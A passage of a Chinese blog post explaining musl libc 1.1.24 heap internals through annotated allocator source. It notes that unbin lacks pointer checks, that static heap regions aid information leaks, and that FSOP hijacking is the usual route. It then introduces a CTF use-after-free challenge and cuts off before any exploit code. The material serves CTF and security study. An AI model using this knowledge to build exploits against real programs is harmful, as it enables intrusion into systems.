class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">c</span>;</span></span><br><span class="line">        <span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// *n = (*n + OVERHEAD + SIZE_ALIGN - 1) &amp; SIZE_MASK;</span></span><br><span class="line">    <span class="comment">// 1. n 增加头部长度，并对齐 32 位</span></span><br><span class="line">        <span class="keyword">if</span> (adjust_size(&amp;n) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 n 到达了 mmap 的门槛（0x38000），则使用 mmap 来申请 chunk</span></span><br><span class="line">        <span class="keyword">if</span> (n &gt; MMAP_THRESHOLD) &#123;</span><br><span class="line">                <span class="type">size_t</span> len = n + OVERHEAD + PAGE_SIZE - <span class="number">1</span> &amp; -PAGE_SIZE;</span><br><span class="line">                <span class="type">char</span> *base = __mmap(<span class="number">0</span>, len, PROT_READ|PROT_WRITE,</span><br><span class="line">                        MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> (base == (<span class="type">void</span> *)<span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                c = (<span class="type">void</span> *)(base + SIZE_ALIGN - OVERHEAD);</span><br><span class="line">                c-&gt;csize = len - (SIZE_ALIGN - OVERHEAD);</span><br><span class="line">                c-&gt;psize = SIZE_ALIGN - OVERHEAD;</span><br><span class="line">                <span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 2. 寻找 n 大小对应的 bin 下标</span></span><br><span class="line">        i = bin_index_up(n);</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="comment">// 3. 查找 binmap</span></span><br><span class="line">                <span class="type">uint64_t</span> mask = mal.binmap &amp; -(<span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line">                <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">                    <span class="comment">// 若所有可用 bin 为空，则调用 expand_heap 函数生成新的 chunk</span></span><br><span class="line">                        c = expand_heap(n);</span><br><span class="line">                        <span class="keyword">if</span> (!c) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">if</span> (alloc_rev(c)) &#123;</span><br><span class="line">                                <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">x</span> =</span> c;</span><br><span class="line">                                c = PREV_CHUNK(c);</span><br><span class="line">                                NEXT_CHUNK(x)-&gt;psize = c-&gt;csize =</span><br><span class="line">                                        x-&gt;csize + CHUNK_SIZE(c);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="comment">// 4. 获取大小最接近 n 的可用 bin 下标 j</span></span><br><span class="line">                j = first_set(mask);</span><br><span class="line">                lock_bin(j);</span><br><span class="line">            <span class="comment">// 5. 获取下标为 j 的 bin 的首部</span></span><br><span class="line">                c = mal.bins[j].head;</span><br><span class="line">            <span class="comment">// 6. 若符合条件，则使用 pretrim 分割 c，否则用 unbin 从链表中取出 c</span></span><br><span class="line">                <span class="keyword">if</span> (c != BIN_TO_CHUNK(j)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!pretrim(c, n, i, j)) unbin(c, j);</span><br><span class="line">                        unlock_bin(j);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                unlock_bin(j);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 7. 回收 c 中大小超过 n 的部分</span></span><br><span class="line">        <span class="comment">/* Now patch up in case we over-allocated */</span></span><br><span class="line">        trim(c, n);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    malloc 主要步骤是通过 binmap 选择 bin，然后取出 bin 首部的 chunk，且取出过程没有任何对链表和 chunk 头部的检测。详细步骤如下：</p><ol><li>对用户申请的大小 n 进行调整，增加头部长度并与 32 位对齐。</li><li>如果 n 达到 mmap 的大小，则使用 mmap 返回内存给用户，否则计算 n 对应 bin 下标 i，查找 binmap。</li><li>如果所有可用的 bin 为空，则生成一个新的 chunk，否则选择大小最接近的 bin，获取其首部的 chunk c。</li><li>如果 c 符合 pretrim 条件，则使用 pretrim 进行切割，否则使用 unbin 从链表中取出 c。</li><li>最后对 chunk 进行 trim，返回给用户。</li></ol><p>​    需要简单了解一下 unbin、pretrim 和 trim。</p><h4 id="unbin"><a href="#unbin" class="headerlink" title="unbin"></a>unbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unbin</span><span class="params">(<span class="keyword">struct</span> chunk *c, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 若 bin 中只有一个 chunk c，将 bin 设置为空 bin</span></span><br><span class="line"><span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line"><span class="comment">// 取出链表中的 chunk</span></span><br><span class="line">    c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">    <span class="comment">// 设置 INUSE 位</span></span><br><span class="line">c-&gt;csize |= C_INUSE;</span><br><span class="line">NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    unbin 相当于 glibc 中的 unlink，作用是从 bin 双向链表中取出 chunk，取出过程并未检查 chunk 指针是否合法。</p><h4 id="pretrim"><a href="#pretrim" class="headerlink" title="pretrim"></a>pretrim</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">pretrim</span><span class="params">(<span class="keyword">struct</span> chunk *self, <span class="type">size_t</span> n, <span class="type">int</span> i, <span class="type">int</span> j)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> n1;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* We cannot pretrim if it would require re-binning. */</span></span><br><span class="line">    <span class="comment">// 条件1：bin j 的下标大于等于 40</span></span><br><span class="line"><span class="keyword">if</span> (j &lt; <span class="number">40</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 条件2：bin j 与 i 相隔了 3 个及以上</span></span><br><span class="line">    <span class="comment">// 或 j == 63 且 split 的大小大于 MMAP_THRESHOLD</span></span><br><span class="line"><span class="keyword">if</span> (j &lt; i+<span class="number">3</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (j != <span class="number">63</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">n1 = CHUNK_SIZE(self);</span><br><span class="line"><span class="keyword">if</span> (n1-n &lt;= MMAP_THRESHOLD) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">n1 = CHUNK_SIZE(self);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 条件3：split 的大小属于 bin j 范围内，即同属于一个 bin</span></span><br><span class="line"><span class="keyword">if</span> (bin_index(n1-n) != j) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 切割出一块大小为 n 的 chunk</span></span><br><span class="line">next = NEXT_CHUNK(self);</span><br><span class="line">split = (<span class="type">void</span> *)((<span class="type">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">split-&gt;prev = self-&gt;prev;</span><br><span class="line">split-&gt;next = self-&gt;next;</span><br><span class="line">split-&gt;prev-&gt;next = split;</span><br><span class="line">split-&gt;next-&gt;prev = split;</span><br><span class="line">split-&gt;psize = n | C_INUSE;</span><br><span class="line">split-&gt;csize = n1-n;</span><br><span class="line">next-&gt;psize = n1-n;</span><br><span class="line">self-&gt;csize = n | C_INUSE;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    pretrim 的功能是用于切割大 chunk，防止把大小超过需求的 chunk 分配给用户。当满足一定条件，pretrim 从 bin 链表首部 chunk 切割出一块大小刚好符合需要的小 chunk，然后将小 chunk 分配给用户，链表首部地址保持不变。</p><h4 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">trim</span><span class="params">(<span class="keyword">struct</span> chunk *self, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> n1 = CHUNK_SIZE(self);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 条件：self的大小 n1 大于 n+DONTCARE（0x10）个字节</span></span><br><span class="line"><span class="keyword">if</span> (n &gt;= n1 - DONTCARE) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 self 的大小切割为 n，剩余部分称为新的 chunk split</span></span><br><span class="line">next = NEXT_CHUNK(self);</span><br><span class="line">split = (<span class="type">void</span> *)((<span class="type">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">split-&gt;psize = n | C_INUSE;</span><br><span class="line">split-&gt;csize = n1-n | C_INUSE;</span><br><span class="line">next-&gt;psize = n1-n | C_INUSE;</span><br><span class="line">self-&gt;csize = n | C_INUSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 split 释放到 bin</span></span><br><span class="line">__bin_chunk(split);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    malloc 的最后一步是 trim，主要作用是回收 chunk 超过需求大小的部分。trim 将多余的部分切割出来，然后将其释放到 bin 中，以减少内存浪费。</p><h3 id="2-3-free-实现"><a href="#2-3-free-实现" class="headerlink" title="2-3 free 实现"></a>2-3 free 实现</h3><h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">self</span> =</span> MEM_TO_CHUNK(p);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// #define IS_MMAPPED(c) !((c)-&gt;csize &amp; (C_INUSE))</span></span><br><span class="line">    <span class="comment">// 若 csize 没有设置 INUSE 标志位，检查是否为 mmap chunk 或 double free</span></span><br><span class="line"><span class="keyword">if</span> (IS_MMAPPED(self))</span><br><span class="line">unmap_chunk(self);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">__bin_chunk(self);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    free 先对 chunk 进行 mmap / double free 检查。如果 chunk 的 csize 字段没有设置 INUSE 标志位，进入 unmap_chunk 函数。</p><h4 id="unmap-chunk"><a href="#unmap-chunk" class="headerlink" title="unmap_chunk"></a>unmap_chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unmap_chunk</span><span class="params">(<span class="keyword">struct</span> chunk *self)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> extra = self-&gt;psize;</span><br><span class="line"><span class="type">char</span> *base = (<span class="type">char</span> *)self - extra;</span><br><span class="line"><span class="type">size_t</span> len = CHUNK_SIZE(self) + extra;</span><br><span class="line"><span class="comment">/* Crash on double free */</span></span><br><span class="line"><span class="keyword">if</span> (extra &amp; <span class="number">1</span>) a_crash();</span><br><span class="line">__munmap(base, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 psize 设置了 INUSE 标志位，视为 double free，程序 crash，否则视为 mmap chunk，调用 __munmap 进行释放。</p><h4 id="bin-chunk"><a href="#bin-chunk" class="headerlink" title="__bin_chunk"></a>__bin_chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __bin_chunk(<span class="keyword">struct</span> chunk *self)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span> =</span> NEXT_CHUNK(self);</span><br><span class="line"><span class="type">size_t</span> final_size, new_size, size;</span><br><span class="line"><span class="type">int</span> reclaim=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new_size 是 self 原来的大小，final_size 是 self 合并空闲 chunk 后的大小</span></span><br><span class="line">final_size = new_size = CHUNK_SIZE(self);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果下一个 chunk 的 psize 位不等于 self 的 csize，则程序 crash</span></span><br><span class="line"><span class="comment">/* Crash on corrupted footer (likely from buffer overflow) */</span></span><br><span class="line"><span class="keyword">if</span> (next-&gt;psize != self-&gt;csize) a_crash();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 检查 self 前后是否有空闲 chunk</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE) &#123;</span><br><span class="line">            <span class="comment">// 去除 INUSE 位</span></span><br><span class="line">self-&gt;csize = final_size | C_INUSE;</span><br><span class="line">next-&gt;psize = final_size | C_INUSE;</span><br><span class="line">            <span class="comment">// 计算 final_size 对应下标</span></span><br><span class="line">i = bin_index(final_size);</span><br><span class="line">lock_bin(i);</span><br><span class="line">lock(mal.free_lock);</span><br><span class="line"><span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE)</span><br><span class="line"><span class="keyword">break</span>;<span class="comment">//退出循环</span></span><br><span class="line">unlock(mal.free_lock);</span><br><span class="line">unlock_bin(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向前合并空闲的 chunk</span></span><br><span class="line"><span class="keyword">if</span> (alloc_rev(self)) &#123;</span><br><span class="line">self = PREV_CHUNK(self);</span><br><span class="line">size = CHUNK_SIZE(self);</span><br><span class="line">final_size += size;</span><br><span class="line"><span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">reclaim = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向后合并空闲的 chunk</span></span><br><span class="line"><span class="keyword">if</span> (alloc_fwd(next)) &#123;</span><br><span class="line">size = CHUNK_SIZE(next);</span><br><span class="line">final_size += size;</span><br><span class="line"><span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">reclaim = <span class="number">1</span>;</span><br><span class="line">next = NEXT_CHUNK(next);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 在 binmap 中，将 bin i 设为非空 bin</span></span><br><span class="line"><span class="keyword">if</span> (!(mal.binmap &amp; <span class="number">1ULL</span>&lt;&lt;i))</span><br><span class="line">a_or_64(&amp;mal.binmap, <span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line"></span><br><span class="line">self-&gt;csize = final_size;</span><br><span class="line">next-&gt;psize = final_size;</span><br><span class="line">unlock(mal.free_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 将 self 加入到 bin i 对应链表的尾部</span></span><br><span class="line">self-&gt;next = BIN_TO_CHUNK(i);</span><br><span class="line">self-&gt;prev = mal.bins[i].tail;</span><br><span class="line">self-&gt;next-&gt;prev = self;</span><br><span class="line">self-&gt;prev-&gt;next = self;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Replace middle of large chunks with fresh zero pages */</span></span><br><span class="line"><span class="keyword">if</span> (reclaim) &#123;</span><br><span class="line"><span class="type">uintptr_t</span> a = (<span class="type">uintptr_t</span>)self + SIZE_ALIGN+PAGE_SIZE<span class="number">-1</span> &amp; -PAGE_SIZE;</span><br><span class="line"><span class="type">uintptr_t</span> b = (<span class="type">uintptr_t</span>)next - SIZE_ALIGN &amp; -PAGE_SIZE;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line">__madvise((<span class="type">void</span> *)a, b-a, MADV_DONTNEED);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">__mmap((<span class="type">void</span> *)a, b-a, PROT_READ|PROT_WRITE,</span><br><span class="line">MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unlock_bin(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    __bin_chunk 的功能是将 chunk 插入到 bin 链表中，首先合并 chunk 前后的空闲 chunk，设置 binmap 和 chunk 标志位，最后将 chunk 插入到 bin 链表中。</p><h3 id="2-4-静态堆内存初始化"><a href="#2-4-静态堆内存初始化" class="headerlink" title="2-4 静态堆内存初始化"></a>2-4 静态堆内存初始化</h3><p>​    在 glibc 中，堆一般位于内存中的动态内存区域，而 musl libc 堆管理器为了减少内存开销，将程序和 libc 库（静态内存）的空闲内存划分为堆内存，并<strong>优先使用静态堆内存</strong>来分配 chunk。只有当静态堆内存耗尽或无法满足需求时，musl libc 才会去申请动态内存。</p><p>​    该特性有助于漏洞利用过程中的<strong>信息泄露</strong>，往往可以得到 libc 或是程序基址信息。</p><h4 id="dls3"><a href="#dls3" class="headerlink" title="__dls3"></a>__dls3</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __dls3(<span class="type">size_t</span> *sp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ....</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">reclaim_gaps(&amp;app);</span><br><span class="line">reclaim_gaps(&amp;ldso);</span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">....</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    源代码很长，关键在于 reclaim_gaps 这个函数。</p><h4 id="reclaim-gaps-amp-reclaim"><a href="#reclaim-gaps-amp-reclaim" class="headerlink" title="reclaim_gaps &amp; reclaim"></a>reclaim_gaps &amp; reclaim</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">reclaim</span><span class="params">(<span class="keyword">struct</span> dso *dso, <span class="type">size_t</span> start, <span class="type">size_t</span> end)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 避开 RELRO 段</span></span><br><span class="line"><span class="keyword">if</span> (start &gt;= dso-&gt;relro_start &amp;&amp; start &lt; dso-&gt;relro_end) start = dso-&gt;relro_end;</span><br><span class="line"><span class="keyword">if</span> (end   &gt;= dso-&gt;relro_start &amp;&amp; end   &lt; dso-&gt;relro_end) end = dso-&gt;relro_start;</span><br><span class="line"><span class="keyword">if</span> (start &gt;= end) <span class="keyword">return</span>;</span><br><span class="line"><span class="type">char</span> *base = laddr_pg(dso, start);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用 __malloc_donate 函数将内存释放到 bin 中</span></span><br><span class="line">__malloc_donate(base, base+(end-start));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">reclaim_gaps</span><span class="params">(<span class="keyword">struct</span> dso *dso)</span></span><br><span class="line">&#123;</span><br><span class="line">Phdr *ph = dso-&gt;phdr;</span><br><span class="line"><span class="type">size_t</span> phcnt = dso-&gt;phnum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历每一个段</span></span><br><span class="line"><span class="keyword">for</span> (; phcnt--; ph=(<span class="type">void</span> *)((<span class="type">char</span> *)ph+dso-&gt;phentsize)) &#123;</span><br><span class="line">        <span class="comment">// 条件1：段不属于可加载段（PT_LOAD）</span></span><br><span class="line"><span class="keyword">if</span> (ph-&gt;p_type!=PT_LOAD) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// 条件2：段可读可写</span></span><br><span class="line"><span class="keyword">if</span> ((ph-&gt;p_flags&amp;(PF_R|PF_W))!=(PF_R|PF_W)) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// 在段所属内存页中，将段的前后空闲内存传递给 reclaim 函数</span></span><br><span class="line">reclaim(dso, ph-&gt;p_vaddr &amp; -PAGE_SIZE, ph-&gt;p_vaddr);</span><br><span class="line">reclaim(dso, ph-&gt;p_vaddr+ph-&gt;p_memsz,</span><br><span class="line">ph-&gt;p_vaddr+ph-&gt;p_memsz+PAGE_SIZE<span class="number">-1</span> &amp; -PAGE_SIZE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    reclaim_gaps 函数通过遍历每个内存段，找到符合条件的段，计算其所属内存页，最后通过 __malloc_donate 将页中的空闲内存释放到 bin 中。</p><h2 id="3-漏洞利用手法"><a href="#3-漏洞利用手法" class="headerlink" title="3 漏洞利用手法"></a>3 漏洞利用手法</h2><p>​    由于在 musl libc 中没有像 glibc 中那样的 hook 指针来调用，所以一般用到的都是 FSOP 即覆盖 FILE 结构体中的某些指针来劫持控制流。</p><p>​    详细的利用手法以后遇到例题再总结上来。</p><h2 id="4-例题"><a href="#4-例题" class="headerlink" title="4 例题"></a>4 例题</h2><h4 id="例题信息"><a href="#例题信息" class="headerlink" title="例题信息"></a>例题信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">来源：2023羊城杯初赛-cookieBox</span><br><span class="line">libc版本：musl libc 1.1.24</span><br><span class="line">漏洞：UAF</span><br><span class="line">限制：堆块大小 &lt;= 0x100</span><br><span class="line">     size 和 chunk 以相同 idx 同时布置在 bss 上，释放堆块会清空 size，edit 和 show 功能会对 size 进行检测。</span><br></pre></td></tr></table></figure><p>ADD</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 